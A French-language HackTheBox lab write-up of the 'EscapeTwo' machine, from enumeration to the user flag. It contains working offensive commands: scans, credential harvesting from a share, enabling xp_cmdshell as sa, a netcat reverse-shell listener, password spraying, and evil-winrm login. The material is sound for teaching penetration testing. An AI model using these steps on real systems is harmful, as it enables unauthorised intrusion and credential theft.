# HackTheBox Challenge Escape Two

## Enumération 

### Nmap

Pour commencer, j'ai effectué une analyse rapide des ports avec la commande suivante :
```
nmap -F -Pn 10.10.11.51
```

La sortie de cette commande a révélé les ports suivants ouverts :
```
Nmap scan report for 10.10.11.51
Host is up (0.026s latency).
Not shown: 93 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
```

Ensuite, j’ai effectué une analyse complète des ports pour identifier tous les ports ouverts :
```
nmap -p- --min-rate 10000 -Pn 10.10.11.51
```

Les résultats de cette analyse sont les suivants :
```
Nmap scan report for 10.10.11.51
Host is up (0.18s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
5985/tcp  open  wsman
47001/tcp open  winrm
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49686/tcp open  unknown
49718/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.42 seconds
```

Pour obtenir plus de détails sur les services en cours d’exécution, j’ai utilisé la commande suivante :
```
nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985 -sCV 10.10.11.51
```

Les résultats détaillés sont :
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 05:26 EST
Nmap scan report for 10.10.11.51
Host is up (0.023s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-22 10:26:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-22T10:28:03+00:00; +1s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-22T10:28:03+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-01-22T10:28:03+00:00; +1s from scanner time.
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-22T05:07:14
|_Not valid after:  2055-01-22T05:07:14
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-22T10:28:03+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-22T10:28:03+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-22T10:27:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.79 seconds
```


* Open ports: 53-88-135-139-389-445-464-593-636-1433-3268-3269-5985
* UDP open ports: 
* Services: DNS - KERBEROS - LDAP - SMB - MSSQL - winRM - LDAPS
* Important notes: Domain: sequel.htb - DNS:DC01.sequel.htb - Microsoft SQL Server 2019

Fichier Hosts
```
sudo sh -c "echo  '10.10.11.51 DC01 sequel.htb DC01.sequel.htb' >> /etc/hosts" 
[sudo] password for kali: 

tail -n 1 /etc/hosts
10.10.11.51 DC01 sequel.htb DC01.sequel.htb    
```

Machine Information
As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su

### MSSQL

```
impacket-mssqlclient sequel.htb/rose:KxEPkKe6R8su@10.10.11.51 -windows-auth
```

```
ldapdomaindump ldap://10.10.11.51 -u "sequel.htb\rose" -p 'KxEPkKe6R8su'
```

```
bloodhound-python -u rose -p KxEPkKe6R8su -ns 10.10.11.51 -d sequel.htb -c all --zip
```

```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.sequel.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 09S
INFO: Compressing output into 20250122062159_bloodhound.zip

```

```
nxc ldap 10.10.11.51 -u rose -p 'KxEPkKe6R8su' -M adcs
```

```
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Initializing NFS protocol database
[*] Initializing WMI protocol database
[*] Initializing LDAP protocol database
[*] Initializing VNC protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                 
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
ADCS        10.10.11.51     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.51     389    DC01             Found PKI Enrollment Server: DC01.sequel.htb
ADCS        10.10.11.51     389    DC01             Found CN: sequel-DC01-CA

```

```
nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
```

```
nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ            

```

```
smbclient //10.10.11.51/Accounting\ Department -U rose

Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

                6367231 blocks of size 4096. 927126 blocks available
```

```
unzip accounts.xlsx 
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: xl/workbook.xml         
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/sharedStrings.xml    
  inflating: _rels/.rels             
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: docProps/custom.xml     
  inflating: [Content_Types].xml   
```

Contenu de xl/sharedStrings.xml :

Angela Martin : angela@sequel.htb, 
angela, 0fwz7Q4mSpurIt99
Oscar Martinez : oscar@sequel.htb, 
oscar, 86LxLBMgEWaKUnBG
Kevin Malone : kevin@sequel.htb, 
kevin, Md9Wlq1E5bZnVDVo
sa : sa@sequel.htb, MSSQLP@ssw0rd!

```
impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.10.11.51 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   

NULL   
```

Creation de Reverse Shell PowerShell : https://github.com/Adkali/PowerJoker

Une fois le reverse reçu:

```
rlwrap -cAR nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.11.51] 64358

JokerShell C:\Windows\system32>
```

```
JokerShell C:\SQL2019\ExpressAdv_ENU> cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAFzzzzzzzzzzz"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

```
nxc ldap 10.10.11.51 -u /usr/share/seclists/Usernames/Names/names.txt -p 'WqSZAFzzzzzzzzzzz' --continue-on-success
```

```
evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAFzzzzzzzzzzz'
```

```
*Evil-WinRM* PS C:\Users\ryan\Desktop> cat user.txt
02f347d7c997dxxxxxxxxxxxxxxxx
```
